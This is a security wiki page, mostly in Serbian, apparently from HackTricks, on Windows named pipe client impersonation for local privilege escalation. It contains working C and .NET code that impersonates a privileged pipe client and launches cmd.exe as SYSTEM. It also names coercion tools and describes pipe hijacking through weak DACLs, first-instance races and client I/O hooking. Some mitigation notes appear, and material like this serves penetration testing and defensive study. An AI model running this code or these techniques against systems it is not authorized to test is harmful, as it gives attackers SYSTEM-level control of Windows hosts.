# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation je lokalni primitive za privilege escalation koji omogućava da thread named-pipe servera preuzme security context klijenta koji se na njega poveže. U praksi, napadač koji može da pokreće code sa SeImpersonatePrivilege može da navede privilegovanog klijenta (npr. SYSTEM service) da se poveže na pipe kojim napadač upravlja, pozove ImpersonateNamedPipeClient, duplira dobijeni token u primary token, i pokrene process kao klijent (često NT AUTHORITY\SYSTEM).

Ova stranica se fokusira na core technique. Za end-to-end exploit chains koje navode SYSTEM da se poveže na tvoj pipe, pogledaj Potato family stranice navedene ispod.

## TL;DR
- Kreiraj named pipe: \\.\pipe\<random> i čekaj konekciju.
- Navedi privilegovanu komponentu da se poveže na njega (spooler/DCOM/EFSRPC/etc.).
- Pročitaj barem jednu poruku iz pipe-a, a zatim pozovi ImpersonateNamedPipeClient.
- Otvori impersonation token sa trenutnog thread-a, DuplicateTokenEx(TokenPrimary), i CreateProcessWithTokenW/CreateProcessAsUser da dobiješ SYSTEM process.

## Requirements and key APIs
- Privileges koji su tipično potrebni za calling process/thread:
- SeImpersonatePrivilege da bi se uspešno impersonisao povezani klijent i da bi se koristio CreateProcessWithTokenW.
- Alternativno, nakon impersonacije SYSTEM, možeš koristiti CreateProcessAsUser, što može zahtevati SeAssignPrimaryTokenPrivilege i SeIncreaseQuotaPrivilege (ovo je ispunjeno kada impersoniraš SYSTEM).
- Core APIs used:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (moraš pročitati barem jednu poruku pre impersonation)
- ImpersonateNamedPipeClient i RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW ili CreateProcessAsUser
- Impersonation level: da bi se izvršile korisne lokalne radnje, klijent mora dozvoliti SecurityImpersonation (podrazumevano za mnoge local RPC/named-pipe klijente). Klijenti ovo mogu da smanje sa SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION kada otvaraju pipe.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notes:
- If ImpersonateNamedPipeClient returns ERROR_CANNOT_IMPERSONATE (1368), ensure you read from the pipe first and that the client didn’t restrict impersonation to Identification level.
- Prefer DuplicateTokenEx with SecurityImpersonation and TokenPrimary to create a primary token suitable for process creation.

## .NET quick example
U .NET-u, NamedPipeServerStream može da impersonira preko RunAsClient. Kada jednom impersonira, dupliraj thread token i kreiraj proces.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
Ove tehnike primoravaju privilegovane servise da se povežu na tvoj named pipe, tako da možeš da ih impersonate:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Pogledaj detaljno korišćenje i kompatibilnost ovde:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Ako ti treba samo kompletan primer pravljenja pipe-a i impersonating radi pokretanja SYSTEM iz service trigger-a, pogledaj:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

Kada privilegovani service i proces sa niskim privilegijama komuniciraju preko `\\.\pipe\...`, tretiraj pipe kao bilo koju drugu nepouzdanu IPC granicu. Pored klasičnog server-side impersonation, slabe pipe ACLs, nesigurni creation flags i odluke o poverenju na strani klijenta mogu postati lokalni privilege escalation primitives.

### Prvo enumeriši kandidat pipe-ove
- Brzo izlistaj pipe-ove iz PowerShell: `Get-ChildItem \\.\pipe\`
- Sysinternals `pipelist64.exe` je koristan da se vide broj instance i single-instance pipe-ovi.
- Daj prioritet imenima koje koriste servisi koji rade kao `SYSTEM`, posebno helperi, updateri, launcher-i i UI brokeri.

### MITM preko permissive DACLs i dodatnih pipe instance
- Svaki proces koji može da komunicira sa privilegovanim serverom već može da fuzz-uje njegov protocol i traži privileged verbs.
- Zanimljiviji slučaj je kada DACL dodeljuje `FILE_GENERIC_WRITE`/`GENERIC_WRITE` nad pipe objektom. Na named pipe-ovima ovo implicitno uključuje `FILE_CREATE_PIPE_INSTANCE` (`FILE_APPEND_DATA` deli isti bit), pa napadač može da kreira drugu server instance sa istim imenom.
- Pošto se instance poklapaju po FIFO redosledu, napadački i legitimni instance mogu da se isprepliću: kreiraj rogue instance sa `CreateNamedPipe`, zatim otvori isto ime pipe-a sa `CreateFile`, i čekaj da pravi client naleti na rogue server instance.
- Rezultat: posmatraj, menjaj, relay, ili desynchronize privilegovani IPC bez potrebe da poseduješ originalni server process.

### First-instance race na pipe security descriptors
- `lpSecurityAttributes` definiše DACL samo kada se kreira prva instance nekog pipe imena.
- Ako privilegovani service kasno startuje i ne koristi `FILE_FLAG_FIRST_PIPE_INSTANCE`, napadač može unapred da kreira pipe ime sa permissive DACL, a zatim da dozvoli servisu da kreira kasnije instance pod security context-om koji je napadač izabrao.
- Ovo pretvara startovanje servisa u race condition: osvoji prvu instance, pa onda kasnije poveži ili MITM-uj client-ove koristeći oslabljenu ACL.
- Mitigation za odbranu, i ključna tačka za pregled za napadače: proveri da li `CreateNamedPipe(..., dwOpenMode, ...)` uključuje `FILE_FLAG_FIRST_PIPE_INSTANCE`. Ako ne, testiraj pre-creation pre nego što service startuje.

### PID/signature provere su hardening, ne boundary
- Neki proizvodi pokušavaju da ograniče pristup proverom `GetNamedPipeClientProcessId`, process image path, ili Authenticode signer-a povezanog client-a.
- Ovo pomaže samo dok ne inject-uješ u legitimni client: jednom unutra trusted process-a, nasleđuješ tačno PID/image/signature context koji server očekuje.
- Za split desktop aplikacije, instrumenting low-privileged UI/helper process je često lakše nego direktno napadati `SYSTEM` service.

### Hookuj client prema njegovom I/O model-u
- Synchronous I/O: intercept `NtWriteFile` pre nego što syscall potroši buffer, i inspect/patch `NtReadFile` nakon što se vrati.
- Overlapped I/O: sačuvaj `OVERLAPPED`/`IoStatusBlock` viđen u `NtReadFile`, pa inspectuj buffer nakon `GetOverlappedResult` ili relevantnog wait-a.
- Completion ports: `GetQueuedCompletionStatus` stiže do `NtRemoveIoCompletion`; vraćeni `ApcContext` povezuje se nazad na `OVERLAPPED` korišćen pri originalnom read-u, što je pravi pivot da se nađe sada popunjen buffer.
- Completion routines (`ReadFileEx`): completion callback se isporučuje kao APC. Ako želiš da menjaš vraćene podatke ili inject-uješ sintetičke reply-je, hookuj pravu completion routine i, za custom injection, koristi `QueueUserAPC` dispatcher sa jednim argumentom koji rekonstruiše 3 očekivana argumenta routine.

### Napomene o alatima
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) proxy-uje named-pipe traffic kroz injected helper DLL i nudi Burp-like workflow za editing/replay.
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) koristi Frida-based pristup i fokusira se na hooking `NtReadFile`/`NtWriteFile` plus async/completion pivot-e iznad, a zatim prosleđuje traffic u WebSocket-backed editing workflow.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Operativna razmatranja
- Named pipes imaju malu latenciju; duge pauze tokom uređivanja bafera mogu da deadlock-uju fragile servise.
- Overlapped/completion-port/APC-driven klijenti zahtevaju drugačije hook-ove od jednostavnih `ReadFile`/`WriteFile` detour-a.
- Injection u trusted klijenta je bučna i generalno je najbolje ostaviti je za exploit development, protocol reversing, ili lokalno lab fuzzing.

## Troubleshooting and gotchas
- Morate pročitati bar jednu poruku iz pipe-a pre nego što pozovete ImpersonateNamedPipeClient; u suprotnom ćete dobiti ERROR_CANNOT_IMPERSONATE (1368).
- Ako se klijent poveže sa SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, server ne može u potpunosti da impersonate; proverite impersonation level token-a preko GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW zahteva SeImpersonatePrivilege na pozivaocu. Ako to ne uspe sa ERROR_PRIVILEGE_NOT_HELD (1314), koristite CreateProcessAsUser nakon što ste već impersonated SYSTEM.
- Uverite se da security descriptor vašeg pipe-a dozvoljava target service-u da se poveže ako ga harden-ujete; podrazumevano, pipes pod \\.\pipe su dostupni prema serverovom DACL-u.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
